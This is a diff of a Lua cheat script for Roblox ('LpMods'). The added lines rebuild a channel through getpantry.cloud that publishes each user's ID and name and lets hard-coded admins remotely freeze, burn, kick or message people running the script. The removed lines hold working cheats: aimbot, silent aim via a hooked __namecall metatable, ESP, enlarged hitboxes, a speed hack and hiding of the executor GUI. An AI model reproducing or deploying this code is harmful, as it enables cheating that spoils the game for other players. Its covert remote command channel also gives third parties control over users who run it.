@@ -16,8 +16,11 @@ local ADMIN_LIST = {
 local isAdmin = ADMIN_LIST[LocalPlayer.UserId] == true
 
 local PANTRY_ID = "2ced635d-2086-462d-ab37-353547add0ed"
-local PANTRY_BASKET = "lpmods_" .. game.JobId:gsub("[^%w]", ""):sub(1, 20)
-local PANTRY_URL = "https://getpantry.cloud/apiv1/pantry/" .. PANTRY_ID .. "/basket/" .. PANTRY_BASKET
+local JOB = game.JobId:gsub("[^%w]", ""):sub(1, 20)
+local USERS_URL = "https://getpantry.cloud/apiv1/pantry/" .. PANTRY_ID .. "/basket/lpu_" .. JOB
+local function cmdUrl(uid)
+    return "https://getpantry.cloud/apiv1/pantry/" .. PANTRY_ID .. "/basket/lpc_" .. JOB .. "_" .. tostring(uid)
+end
 
 local Window = Fluent:CreateWindow({
     Title = "LpMods",
@@ -56,7 +59,6 @@ local executorEscondido = false
 local guisEscondidos = {}
 
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
-
 local bloqueadoAte = 0
 
 local function httpGet(url)
@@ -77,11 +79,11 @@ local function httpGet(url)
     return nil
 end
 
-local function httpPut(url, body)
+local function httpSend(url, body, method)
     if os.time() < bloqueadoAte then return nil end
     if not httpRequest then return nil end
     local ok, res = pcall(httpRequest, {
-        Url = url, Method = "PUT",
+        Url = url, Method = method or "POST",
         Headers = { ["Content-Type"] = "application/json" },
         Body = body
     })
@@ -93,126 +95,102 @@ local function httpPut(url, body)
     return nil
 end
 
-local function httpPost(url, body)
-    if os.time() < bloqueadoAte then return nil end
-    if not httpRequest then return nil end
-    local ok, res = pcall(httpRequest, {
-        Url = url, Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = body
-    })
-    if ok and res then
-        local status = res.StatusCode or res.Status
-        if status == 429 then bloqueadoAte = os.time() + 30; return nil end
-        return res.Body
-    end
-    return nil
-end
-
-local RegisteredUsers = {}
-local LastCommandTs = os.time() - 5
-local PendingAdminCommands = {}
-local LastCommandsProcessed = {}
-
-local function lerBasket()
-    local raw = httpGet(PANTRY_URL)
+local function lerBasket(url)
+    local raw = httpGet(url)
     if not raw or raw == "" or raw:sub(1,1) ~= "{" then return nil end
     local ok, data = pcall(function() return Services.HttpService:JSONDecode(raw) end)
     if ok and type(data) == "table" then return data end
     return nil
 end
 
-local function salvarBasket(data)
+local function salvarBasket(url, data)
     local payload = Services.HttpService:JSONEncode(data)
-    local primeiro = httpPost(PANTRY_URL, payload)
-    if not primeiro then
-        httpPut(PANTRY_URL, payload)
-    end
+    local r = httpSend(url, payload, "POST")
+    if not r then r = httpSend(url, payload, "PUT") end
+    return r
 end
+
+local RegisteredUsers = {}
+local PendingAdminCommands = {}
+local ProcessedCommands = {}
 
 local function publishHeartbeat()
     pcall(function()
-        local data = lerBasket() or {}
-        data.users = data.users or {}
-        data.commands = data.commands or {}
-
+        local data = lerBasket(USERS_URL) or {}
         local agora = os.time()
-        for uid, info in pairs(data.users) do
+        for uid, info in pairs(data) do
             if type(info) == "table" and (agora - (info.ts or 0)) > 60 then
-                data.users[uid] = nil
+                data[uid] = nil
             end
         end
-        for uid, cmd in pairs(data.commands) do
-            if type(cmd) == "table" and (agora - (cmd.ts or 0)) > 30 then
-                data.commands[uid] = nil
-            end
-        end
-
-        data.users[tostring(LocalPlayer.UserId)] = {
+        data[tostring(LocalPlayer.UserId)] = {
             name = LocalPlayer.Name,
             ts = agora
         }
-
-        salvarBasket(data)
+        salvarBasket(USERS_URL, data)
     end)
 end
 
-local function pollBasket()
+local function pollUsers()
     pcall(function()
-        local data = lerBasket()
+        local data = lerBasket(USERS_URL)
         if not data then return end
-
-        local agora = os.time()
         local seen = {}
-        if data.users then
-            for uid, info in pairs(data.users) do
-                if type(info) == "table" then
-                    local age = agora - (info.ts or 0)
-                    if age < 90 then
-                        seen[tonumber(uid) or uid] = info
-                    end
+        local agora = os.time()
+        for uid, info in pairs(data) do
+            if type(info) == "table" then
+                if (agora - (info.ts or 0)) < 90 then
+                    seen[tonumber(uid) or uid] = info
                 end
             end
         end
         RegisteredUsers = seen
-
-        if data.commands then
-            local meu = data.commands[tostring(LocalPlayer.UserId)]
-            if meu and type(meu) == "table" and (meu.ts or 0) > LastCommandTs then
-                local chave = tostring(meu.ts) .. "_" .. tostring(meu.cmd)
-                if not LastCommandsProcessed[chave] then
-                    LastCommandsProcessed[chave] = true
-                    LastCommandTs = meu.ts
-                    if meu.from ~= LocalPlayer.UserId then
-                        table.insert(PendingAdminCommands, meu)
-                    end
-                end
-            end
-        end
-
-        local n = 0
-        for k, _ in pairs(LastCommandsProcessed) do
-            n = n + 1
-            if n > 50 then LastCommandsProcessed = {}; break end
-        end
     end)
 end
 
 local function sendAdminCommand(targetId, cmd, args)
     pcall(function()
-        local data = lerBasket() or {}
-        data.users = data.users or {}
-        data.commands = data.commands or {}
-
-        data.commands[tostring(targetId)] = {
+        local url = cmdUrl(targetId)
+        local data = lerBasket(url) or {}
+        data.fila = data.fila or {}
+        table.insert(data.fila, {
             cmd = cmd,
             args = args or {},
             from = LocalPlayer.UserId,
             fromName = LocalPlayer.Name,
-            ts = os.time()
-        }
+            ts = os.time(),
+            id = tostring(os.time()) .. "_" .. tostring(math.random(1000, 9999))
+        })
+        if #data.fila > 20 then
+            table.remove(data.fila, 1)
+        end
+        local resultado = salvarBasket(url, data)
+        if isAdmin then
+            Fluent:Notify({
+                Title = "CMD enviado",
+                Content = (resultado and "OK" or "FALHOU") .. " | " .. cmd .. " -> " .. tostring(targetId),
+                Duration = 4
+            })
+        end
+    end)
+end
 
-        salvarBasket(data)
+local function pollMyCommands()
+    pcall(function()
+        local url = cmdUrl(LocalPlayer.UserId)
+        local data = lerBasket(url)
+        if not data or not data.fila then return end
+        for _, item in ipairs(data.fila) do
+            if type(item) == "table" and item.id then
+                if not ProcessedCommands[item.id] and item.from ~= LocalPlayer.UserId then
+                    ProcessedCommands[item.id] = true
+                    table.insert(PendingAdminCommands, item)
+                end
+            end
+        end
+        local total = 0
+        for _ in pairs(ProcessedCommands) do total = total + 1 end
+        if total > 100 then ProcessedCommands = {} end
     end)
 end
 
@@ -267,7 +245,9 @@ local function handleIncomingCommand(data)
         if hrp then hrp.Anchored = false end
         showAdminPopup("Voce foi DESCONGELADO.")
     elseif data.cmd == "kick" then
-        LocalPlayer:Kick("Admin: " .. (data.args.reason or "Sem motivo"))
+        task.delay(0.5, function()
+            LocalPlayer:Kick("Admin: " .. (data.args.reason or "Sem motivo"))
+        end)
     elseif data.cmd == "message" then
         showAdminPopup(data.args.text or "Mensagem do admin")
     elseif data.cmd == "burn" then
@@ -313,12 +293,26 @@ local function removeLpTag(player)
     end
 end
 
+pcall(publishHeartbeat)
+
 task.spawn(function()
-    while task.wait(15) do
-        if os.time() >= bloqueadoAte then
+    local contador = 0
+    while task.wait(5) do
+        if os.time() < bloqueadoAte then continue end
+        contador = contador + 1
+
+        pcall(pollMyCommands)
+
+        if #PendingAdminCommands > 0 then
+            for _, cmd in ipairs(PendingAdminCommands) do
+                pcall(function() handleIncomingCommand(cmd) end)
+            end
+            PendingAdminCommands = {}
+        end
+
+        if contador % 3 == 0 then
             pcall(publishHeartbeat)
-            task.wait(1)
-            pcall(pollBasket)
+            pcall(pollUsers)
 
             for _, player in pairs(Services.Players:GetPlayers()) do
                 if player ~= LocalPlayer then
@@ -328,13 +322,6 @@ task.spawn(function()
                         removeLpTag(player)
                     end
                 end
-            end
-
-            if #PendingAdminCommands > 0 then
-                for _, cmd in ipairs(PendingAdminCommands) do
-                    pcall(function() handleIncomingCommand(cmd) end)
-                end
-                PendingAdminCommands = {}
             end
         end
     end
@@ -533,7 +520,7 @@ local function abrirPainelAdmin()
         for _, child in pairs(listFrame:GetChildren()) do
             if child:IsA("TextButton") or child:IsA("TextLabel") then child:Destroy() end
         end
-        pcall(pollBasket)
+        pcall(pollUsers)
         local count = 0
         for uid, info in pairs(RegisteredUsers) do
             if uid ~= LocalPlayer.UserId then
@@ -559,662 +546,4 @@ local function abrirPainelAdmin()
                 uidLabel.BackgroundTransparency = 1
                 uidLabel.Text = tostring(uid)
                 uidLabel.Font = Enum.Font.Gotham
-                uidLabel.TextSize = isMobile and 10 or 11
-                uidLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
-                uidLabel.TextXAlignment = Enum.TextXAlignment.Right
-                uidLabel.Parent = btn
-
-                btn.MouseButton1Click:Connect(function()
-                    selectedTarget = uid
-                    statusBox.Text = "Alvo: " .. (info.name or "?") .. " [" .. tostring(uid) .. "]"
-                    btn.BackgroundColor3 = Color3.fromRGB(60, 15, 15)
-                end)
-            end
-        end
-        if count == 0 then
-            local vazio = Instance.new("TextLabel")
-            vazio.Size = UDim2.new(1, -8, 0, 40)
-            vazio.BackgroundTransparency = 1
-            vazio.Text = "Ninguem rodando o script ainda"
-            vazio.Font = Enum.Font.Gotham
-            vazio.TextSize = isMobile and 11 or 12
-            vazio.TextColor3 = Color3.fromRGB(100, 100, 100)
-            vazio.Parent = listFrame
-        end
-    end
-    atualizarLista()
-
-    criarBotao(yCursor, "Atualizar Lista", Color3.fromRGB(40, 40, 40), Color3.fromRGB(255,255,255), function()
-        atualizarLista()
-    end)
-    yCursor = yCursor + (isMobile and 40 or 38)
-
-    criarBotao(yCursor, "Congelar", Color3.fromRGB(45, 10, 10), Color3.fromRGB(255, 200, 200), function()
-        if selectedTarget then sendAdminCommand(selectedTarget, "freeze") end
-    end)
-    yCursor = yCursor + (isMobile and 40 or 38)
-
-    criarBotao(yCursor, "Descongelar", Color3.fromRGB(20, 40, 20), Color3.fromRGB(200, 255, 200), function()
-        if selectedTarget then sendAdminCommand(selectedTarget, "unfreeze") end
-    end)
-    yCursor = yCursor + (isMobile and 40 or 38)
-
-    criarBotao(yCursor, "Incendiar", Color3.fromRGB(60, 25, 0), Color3.fromRGB(255, 200, 120), function()
-        if selectedTarget then sendAdminCommand(selectedTarget, "burn") end
-    end)
-    yCursor = yCursor + (isMobile and 40 or 38)
-
-    criarBotao(yCursor, "Enviar Mensagem", Color3.fromRGB(25, 25, 50), Color3.fromRGB(180, 180, 255), function()
-        if not selectedTarget then return end
-        local txt = reasonBox.Text
-        if txt == "" then txt = "Voce foi reportado por um admin." end
-        sendAdminCommand(selectedTarget, "message", { text = txt })
-    end)
-    yCursor = yCursor + (isMobile and 40 or 38)
-
-    criarBotao(yCursor, "KICKAR", Color3.fromRGB(120, 20, 20), Color3.fromRGB(255, 230, 230), function()
-        if not selectedTarget then return end
-        local motivo = reasonBox.Text
-        if motivo == "" then motivo = "Sem motivo informado" end
-        sendAdminCommand(selectedTarget, "kick", { reason = motivo })
-    end)
-end
-
-local function ehChat(nome)
-    local n = nome:lower()
-    return n:find("chat") or n:find("bubble") or n:find("textchat")
-        or n:find("topbar") or n:find("topbarplus")
-end
-
-local function definirVisibilidadeExecutor(visivel)
-    local executorGui = gethui and gethui() or game.CoreGui
-    if not executorGui then return end
-    if visivel then
-        for _, gui in pairs(guisEscondidos) do
-            pcall(function() gui.Enabled = true end)
-        end
-        guisEscondidos = {}
-    else
-        guisEscondidos = {}
-        for _, item in pairs(executorGui:GetChildren()) do
-            if item:IsA("ScreenGui") and not ehChat(item.Name) then
-                if item.Enabled then item.Enabled = false; table.insert(guisEscondidos, item) end
-            end
-        end
-        for _, item in pairs(game.CoreGui:GetChildren()) do
-            if item:IsA("ScreenGui")
-                and item.Name ~= "LpModsFloatingButtonGui"
-                and item.Name ~= "LpModsTopBanner"
-                and item.Name ~= "LpAdminPainel"
-                and not item.Name:find("Fluent")
-                and not ehChat(item.Name) then
-                if item.Enabled then item.Enabled = false; table.insert(guisEscondidos, item) end
-            end
-        end
-    end
-end
-
-local function AlternarExecutor()
-    executorEscondido = not executorEscondido
-    definirVisibilidadeExecutor(not executorEscondido)
-    pcall(function()
-        Fluent:Notify({
-            Title = "Executor",
-            Content = executorEscondido and "Executor escondido." or "Executor visivel.",
-            Duration = 3
-        })
-    end)
-end
-
-LocalPlayer.Chatted:Connect(function(msg)
-    local cmd = msg:lower():gsub("^%s*(.-)%s*$", "%1")
-    if cmd == ".hub" then definirVisibilidadeExecutor(true); executorEscondido = false
-    elseif cmd == ".hide" then definirVisibilidadeExecutor(false); executorEscondido = true
-    elseif isAdmin and (cmd == ".lpadm" or cmd == "/lpadm" or cmd == ";lpadm") then abrirPainelAdmin() end
-end)
-
-pcall(function()
-    local TextChatService = game:GetService("TextChatService")
-    if TextChatService then
-        TextChatService.MessageReceived:Connect(function(message)
-            local sender = message.TextSource and message.TextSource.UserId
-            if sender == LocalPlayer.UserId then
-                local t = message.Text:lower()
-                if t:find(".hub") then definirVisibilidadeExecutor(true); executorEscondido = false
-                elseif t:find(".hide") then definirVisibilidadeExecutor(false); executorEscondido = true
-                elseif isAdmin and (t:find(".lpadm") or t:find("/lpadm") or t:find(";lpadm")) then abrirPainelAdmin() end
-            end
-        end)
-    end
-end)
-
-if isAdmin then
-    Services.UserInputService.InputBegan:Connect(function(input, gpe)
-        if gpe then return end
-        if input.KeyCode == Enum.KeyCode.F10 then abrirPainelAdmin() end
-    end)
-end
-
-local BannerGui = Instance.new("ScreenGui")
-BannerGui.Name = "LpModsTopBanner"
-BannerGui.ResetOnSpawn = false
-BannerGui.IgnoreGuiInset = true
-BannerGui.DisplayOrder = 999999
-
-if syn and syn.protect_gui then
-    syn.protect_gui(BannerGui); BannerGui.Parent = game.CoreGui
-elseif gethui then
-    BannerGui.Parent = gethui()
-else
-    BannerGui.Parent = game.CoreGui
-end
-
-local Banner = Instance.new("TextButton")
-Banner.Name = "BannerDiscord"
-Banner.Parent = BannerGui
-Banner.Size = UDim2.new(1, 0, 0, 30)
-Banner.Position = UDim2.new(0, 0, 0, 0)
-Banner.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-Banner.BackgroundTransparency = 0.15
-Banner.BorderSizePixel = 0
-Banner.Text = "discord.gg/Pga8XBq   -   clique para copiar"
-Banner.Font = Enum.Font.GothamBold
-Banner.TextSize = 14
-Banner.TextColor3 = Color3.fromRGB(255, 255, 255)
-Banner.AutoButtonColor = true
-Banner.Active = true
-
-local BannerStroke = Instance.new("UIStroke")
-BannerStroke.Color = Color3.fromRGB(88, 101, 242)
-BannerStroke.Thickness = 1
-BannerStroke.Transparency = 0.2
-BannerStroke.Parent = Banner
-
-Banner.MouseButton1Click:Connect(function()
-    setclipboard("https://discord.gg/Pga8XBq")
-    Banner.Text = "copiado!"
-    task.delay(2, function()
-        Banner.Text = "discord.gg/Pga8XBq   -   clique para copiar"
-    end)
-end)
-
-local function AjustarEscalaBanner()
-    local vp = Camera and Camera.ViewportSize or Vector2.new(1920, 1080)
-    Banner.TextSize = math.clamp(math.floor(vp.X / 100), 12, 20)
-end
-AjustarEscalaBanner()
-if Camera then
-    Camera:GetPropertyChangedSignal("ViewportSize"):Connect(AjustarEscalaBanner)
-end
-
-local function ApplyHitbox(player)
-    local char = player.Character
-    if not char then return end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    local head = char:FindFirstChild("Head")
-    if not hrp then return end
-
-    if not OriginalHitbox[player] then
-        OriginalHitbox[player] = {
-            hrpSize = hrp.Size, hrpTransparency = hrp.Transparency, hrpCanCollide = hrp.CanCollide,
-            headSize = head and head.Size or nil, headTransparency = head and head.Transparency or nil,
-        }
-    end
-
-    local orig = OriginalHitbox[player]
-    local mult = Settings.HitboxSize
-
-    hrp.Size = Vector3.new(orig.hrpSize.X * mult, orig.hrpSize.Y * mult, orig.hrpSize.Z * mult)
-    hrp.Transparency = Settings.HitboxVisible and 0.5 or 1
-    hrp.CanCollide = false
-
-    if head and orig.headSize then
-        head.Size = Vector3.new(orig.headSize.X * mult, orig.headSize.Y * mult, orig.headSize.Z * mult)
-        head.Transparency = Settings.HitboxVisible and 0.5 or 1
-        head.CanCollide = false
-    end
-end
-
-local function RestoreHitbox(player)
-    local char = player.Character
-    local orig = OriginalHitbox[player]
-    if not char or not orig then return end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    local head = char:FindFirstChild("Head")
-    if hrp then
-        hrp.Size = orig.hrpSize
-        hrp.Transparency = orig.hrpTransparency
-        hrp.CanCollide = orig.hrpCanCollide
-    end
-    if head and orig.headSize then
-        head.Size = orig.headSize
-        head.Transparency = orig.headTransparency
-    end
-    OriginalHitbox[player] = nil
-end
-
-local function RestoreAllHitboxes()
-    for player, _ in pairs(OriginalHitbox) do RestoreHitbox(player) end
-    OriginalHitbox = {}
-end
-
-Services.RunService.Heartbeat:Connect(function()
-    for _, player in pairs(Services.Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            if Settings.HitboxEnabled then
-                ApplyHitbox(player)
-            elseif OriginalHitbox[player] then
-                RestoreHitbox(player)
-            end
-        end
-    end
-end)
-
-Services.Players.PlayerRemoving:Connect(function(player)
-    OriginalHitbox[player] = nil
-end)
-
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.Color = Color3.fromRGB(255, 255, 255)
-FOVCircle.Thickness = 1.5
-FOVCircle.Filled = false
-FOVCircle.Transparency = 0.8
-FOVCircle.Visible = false
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "LpModsFloatingButtonGui"
-ScreenGui.ResetOnSpawn = false
-
-if syn and syn.protect_gui then
-    syn.protect_gui(ScreenGui); ScreenGui.Parent = game.CoreGui
-elseif gethui then
-    ScreenGui.Parent = gethui()
-else
-    ScreenGui.Parent = game.CoreGui
-end
-
-local FloatButton = Instance.new("TextButton")
-FloatButton.Name = "LpModsFloatBtn"
-FloatButton.Parent = ScreenGui
-FloatButton.Size = UDim2.new(0, 55, 0, 55)
-FloatButton.Position = UDim2.new(0.05, 0, 0.2, 0)
-FloatButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FloatButton.BackgroundTransparency = 0.2
-FloatButton.BorderSizePixel = 0
-FloatButton.Active = true
-FloatButton.Draggable = true
-FloatButton.Text = "LP"
-FloatButton.Font = Enum.Font.GothamBold
-FloatButton.TextSize = 20
-FloatButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-FloatButton.AutoButtonColor = false
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 10)
-UICorner.Parent = FloatButton
-
-FloatButton.MouseButton1Click:Connect(function()
-    if Window then Window:Minimize() end
-end)
-
-local function IsAlly(player)
-    if not player or not player.Team then return false end
-    return player.Team == LocalPlayer.Team
-end
-
-local function HasLineOfSight(targetPart)
-    if not targetPart then return false end
-    local myChar = LocalPlayer.Character
-    local origin = Camera.CFrame.Position
-    local params = RaycastParams.new()
-    params.FilterType = Enum.RaycastFilterType.Exclude
-    params.FilterDescendantsInstances = { myChar, targetPart.Parent }
-    local result = workspace:Raycast(origin, targetPart.Position - origin, params)
-    return result == nil
-end
-
-local function ApplySpeed()
-    local char = LocalPlayer.Character
-    if char then
-        local humanoid = char:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            humanoid.WalkSpeed = Settings.EnableSpeed and Settings.Speed or 16
-        end
-    end
-end
-
-Services.RunService.Stepped:Connect(function()
-    if Settings.EnableSpeed then
-        local char = LocalPlayer.Character
-        if char then
-            local humanoid = char:FindFirstChildOfClass("Humanoid")
-            if humanoid and humanoid.WalkSpeed ~= Settings.Speed then
-                humanoid.WalkSpeed = Settings.Speed
-            end
-        end
-    end
-end)
-
-local function GetClosestPlayer()
-    local Target = nil
-    local MaxDistance = Settings.FOVSize
-    local CenterScreen = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-
-    for _, player in pairs(Services.Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character then
-            local char = player.Character
-            local head = char:FindFirstChild("Head")
-            local humanoid = char:FindFirstChildOfClass("Humanoid")
-            local rootPart = char:FindFirstChild("HumanoidRootPart")
-
-            if head and humanoid and rootPart then
-                if Settings.TeamCheck and IsAlly(player) then continue end
-                if Settings.IgnoreDead then
-                    if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead or not char:IsDescendantOf(workspace) then continue end
-                else
-                    if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then continue end
-                end
-                if Settings.WallCheck and not HasLineOfSight(head) then continue end
-
-                local headPos, onScreen = Camera:WorldToViewportPoint(head.Position)
-                if onScreen then
-                    local distance = (Vector2.new(headPos.X, headPos.Y) - CenterScreen).Magnitude
-                    if distance <= MaxDistance then
-                        MaxDistance = distance
-                        Target = player
-                    end
-                end
-            end
-        end
-    end
-    return Target
-end
-
-local mt = getrawmetatable(game)
-local oldNamecall = mt.__namecall
-setreadonly(mt, false)
-mt.__namecall = newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-    if Settings.Silent and Settings.Aimbot and (method == "FindPartOnRay" or method == "FindPartOnRayWithIgnoreList" or method == "FindPartOnRayWithWhitelist" or method == "Raycast") then
-        local args = {...}
-        local ray = args[1]
-        local comprimento = 0
-        if typeof(ray) == "Ray" then comprimento = ray.Direction.Magnitude
-        elseif typeof(ray) == "Vector3" then comprimento = ray.Magnitude end
-        if comprimento > 0 and comprimento < 30 then return oldNamecall(self, ...) end
-
-        local myChar = LocalPlayer.Character
-        if myChar and typeof(ray) == "Ray" then
-            local myHRP = myChar:FindFirstChild("HumanoidRootPart")
-            if myHRP and (ray.Origin - myHRP.Position).Magnitude < 3 then
-                return oldNamecall(self, ...)
-            end
-        end
-
-        if typeof(ray) == "Ray" and ray.Direction.Unit.Y < -0.7 then
-            return oldNamecall(self, ...)
-        end
-
-        local target = GetClosestPlayer()
-        if target and target.Character then
-            local head = target.Character:FindFirstChild("Head")
-            local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
-            if head and humanoid and humanoid.Health > 0 then
-                if method == "Raycast" then
-                    args[2] = head.Position
-                else
-                    if typeof(ray) == "Ray" then
-                        local dir = (head.Position - ray.Origin).Unit * (ray.Direction.Magnitude > 0 and ray.Direction.Magnitude or 1000)
-                        args[1] = Ray.new(ray.Origin, dir)
-                    end
-                end
-                return oldNamecall(self, table.unpack(args))
-            end
-        end
-    end
-    return oldNamecall(self, ...)
-end)
-setreadonly(mt, true)
-
-local ESPDrawings = {}
-
-local function CreateESP(player)
-    if ESPDrawings[player] then return end
-    local drawings = {
-        Box = Drawing.new("Square"),
-        Line = Drawing.new("Line"),
-        Name = Drawing.new("Text")
-    }
-    drawings.Box.Color = CyanColor; drawings.Box.Thickness = 1.5; drawings.Box.Filled = false
-    drawings.Line.Color = CyanColor; drawings.Line.Thickness = 1
-    drawings.Name.Color = CyanColor; drawings.Name.Size = 13; drawings.Name.Center = true; drawings.Name.Outline = true
-    ESPDrawings[player] = drawings
-end
-
-local function RemoveESP(player)
-    if ESPDrawings[player] then
-        for _, v in pairs(ESPDrawings[player]) do v:Remove() end
-        ESPDrawings[player] = nil
-    end
-    if player.Character and player.Character:FindFirstChild("LpModsChams") then
-        player.Character.LpModsChams:Destroy()
-    end
-end
-
-Services.Players.PlayerRemoving:Connect(RemoveESP)
-
-Services.RunService.RenderStepped:Connect(function()
-    local CenterScreen = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-    FOVCircle.Position = CenterScreen
-    FOVCircle.Radius = Settings.FOVSize
-    FOVCircle.Visible = Settings.ShowFOV
-
-    if Settings.Aimbot then
-        local target = GetClosestPlayer()
-        if target and target.Character then
-            local head = target.Character:FindFirstChild("Head")
-            local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
-            if head and humanoid and humanoid.Health > 0 and not Settings.Silent then
-                Camera.CFrame = CFrame.new(Camera.CFrame.Position, head.Position)
-            end
-        end
-    end
-
-    if Settings.Spinbot and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(150), 0)
-    end
-
-    for _, player in pairs(Services.Players:GetPlayers()) do
-        if player ~= LocalPlayer then
-            if not ESPDrawings[player] then CreateESP(player) end
-            local drawings = ESPDrawings[player]
-            local char = player.Character
-            local humanoid = char and char:FindFirstChildOfClass("Humanoid")
-            local ally = IsAlly(player)
-            local shouldRender = ally and Settings.ESP_Ally or (not ally and Settings.ESP_Master)
-
-            if shouldRender and char and humanoid and humanoid.Health > 0 then
-                local cframe, size = char:GetBoundingBox()
-                local screenPos, onScreen = Camera:WorldToViewportPoint(cframe.Position)
-                if onScreen then
-                    local renderColor = ally and Settings.AllyColor or CyanColor
-                    drawings.Box.Color = renderColor
-                    drawings.Line.Color = renderColor
-                    drawings.Name.Color = renderColor
-
-                    local topWorld = cframe.Position + Vector3.new(0, size.Y / 2, 0)
-                    local bottomWorld = cframe.Position - Vector3.new(0, size.Y / 2, 0)
-                    local topScreen = Camera:WorldToViewportPoint(topWorld)
-                    local bottomScreen = Camera:WorldToViewportPoint(bottomWorld)
-                    local height = math.abs(topScreen.Y - bottomScreen.Y)
-                    local width = height / 1.6
-
-                    if Settings.ESP_Boxes then
-                        drawings.Box.Size = Vector2.new(width, height)
-                        drawings.Box.Position = Vector2.new(screenPos.X - width / 2, topScreen.Y)
-                        drawings.Box.Visible = true
-                    else drawings.Box.Visible = false end
-
-                    if Settings.ESP_Lines then
-                        drawings.Line.From = Vector2.new(Camera.ViewportSize.X / 2, 0)
-                        drawings.Line.To = Vector2.new(screenPos.X, topScreen.Y)
-                        drawings.Line.Visible = true
-                    else drawings.Line.Visible = false end
-
-                    if Settings.ESP_Names then
-                        drawings.Name.Text = player.Name .. (ally and " [ALLY]" or "")
-                        drawings.Name.Position = Vector2.new(screenPos.X, topScreen.Y - 16)
-                        drawings.Name.Visible = true
-                    else drawings.Name.Visible = false end
-
-                    if Settings.ESP_Player then
-                        local highlight = char:FindFirstChild("LpModsChams")
-                        if not highlight then
-                            highlight = Instance.new("Highlight")
-                            highlight.Name = "LpModsChams"
-                            highlight.FillColor = renderColor
-                            highlight.OutlineColor = renderColor
-                            highlight.FillTransparency = 0.5
-                            highlight.OutlineTransparency = 0
-                            highlight.Parent = char
-                        end
-                        highlight.FillColor = renderColor
-                        highlight.OutlineColor = renderColor
-                        highlight.Enabled = true
-                    else
-                        if char:FindFirstChild("LpModsChams") then char.LpModsChams.Enabled = false end
-                    end
-                else
-                    drawings.Box.Visible = false; drawings.Line.Visible = false; drawings.Name.Visible = false
-                    if char:FindFirstChild("LpModsChams") then char.LpModsChams.Enabled = false end
-                end
-            else
-                drawings.Box.Visible = false; drawings.Line.Visible = false; drawings.Name.Visible = false
-                if char and char:FindFirstChild("LpModsChams") then char.LpModsChams.Enabled = false end
-            end
-        end
-    end
-end)
-
-Tabs.Combat:AddToggle("Aimbot", { Title = "Aimbot Gruda na Cabeca", Default = false, Callback = function(v) Settings.Aimbot = v end })
-Tabs.Combat:AddToggle("Silent", { Title = "Silent Aim", Default = false, Callback = function(v) Settings.Silent = v end })
-Tabs.Combat:AddToggle("IgnoreDead", { Title = "Ignorar Mortos no Chao", Default = false, Callback = function(v) Settings.IgnoreDead = v end })
-Tabs.Combat:AddToggle("ShowFOV", { Title = "Mostrar FOV", Default = false, Callback = function(v) Settings.ShowFOV = v end })
-Tabs.Combat:AddToggle("TeamCheckCombat", { Title = "Team Check", Default = false, Callback = function(v) Settings.TeamCheck = v end })
-Tabs.Combat:AddToggle("WallCheckCombat", { Title = "Wall Check", Default = false, Callback = function(v) Settings.WallCheck = v end })
-
-Tabs.Combat:AddSlider("FOVSize", {
-    Title = "Tamanho do FOV", Min = 30, Max = 500, Default = 100, Rounding = 0,
-    Callback = function(v) Settings.FOVSize = v end
-})
-
-Tabs.Visuals:AddToggle("ESPMaster", { Title = "Ativar ESP (Master)", Default = false, Callback = function(v) Settings.ESP_Master = v end })
-Tabs.Visuals:AddToggle("ESPAlly", { Title = "ESP Aliado", Default = false, Callback = function(v) Settings.ESP_Ally = v end })
-Tabs.Visuals:AddToggle("ESPPlayer", { Title = "ESP Player", Default = false, Callback = function(v) Settings.ESP_Player = v end })
-Tabs.Visuals:AddToggle("ESPBoxes", { Title = "ESP Boxes", Default = false, Callback = function(v) Settings.ESP_Boxes = v end })
-Tabs.Visuals:AddToggle("ESPLines", { Title = "ESP Lines", Default = false, Callback = function(v) Settings.ESP_Lines = v end })
-Tabs.Visuals:AddToggle("ESPNames", { Title = "ESP Name", Default = false, Callback = function(v) Settings.ESP_Names = v end })
-
-Tabs.Hitbox:AddToggle("HitboxEnabled", {
-    Title = "Ativar Hitbox Expandida", Default = false,
-    Callback = function(v)
-        Settings.HitboxEnabled = v
-        if not v then RestoreAllHitboxes() end
-    end
-})
-
-Tabs.Hitbox:AddSlider("HitboxSize", {
-    Title = "Tamanho da Hitbox", Min = 1, Max = 20, Default = 5, Rounding = 1,
-    Callback = function(v) Settings.HitboxSize = v end
-})
-
-Tabs.Hitbox:AddInput("HitboxSizeInput", {
-    Title = "Tamanho por texto", Default = "5", Placeholder = "1 a 50",
-    Numeric = true, Finished = true,
-    Callback = function(v)
-        local n = tonumber(v)
-        if n then Settings.HitboxSize = math.clamp(n, 1, 50) end
-    end
-})
-
-Tabs.Hitbox:AddToggle("HitboxVisible", {
-    Title = "Mostrar Hitbox (visual)", Default = false,
-    Callback = function(v) Settings.HitboxVisible = v end
-})
-
-Tabs.Hitbox:AddButton({
-    Title = "Restaurar Hitboxes", Description = "Volta tudo pro tamanho original",
-    Callback = function()
-        RestoreAllHitboxes()
-        Fluent:Notify({ Title = "Hitbox", Content = "Hitboxes restauradas.", Duration = 3 })
-    end
-})
-
-Tabs.Movement:AddToggle("EnableSpeed", { Title = "Ativar Velocidade", Default = false, Callback = function(v)
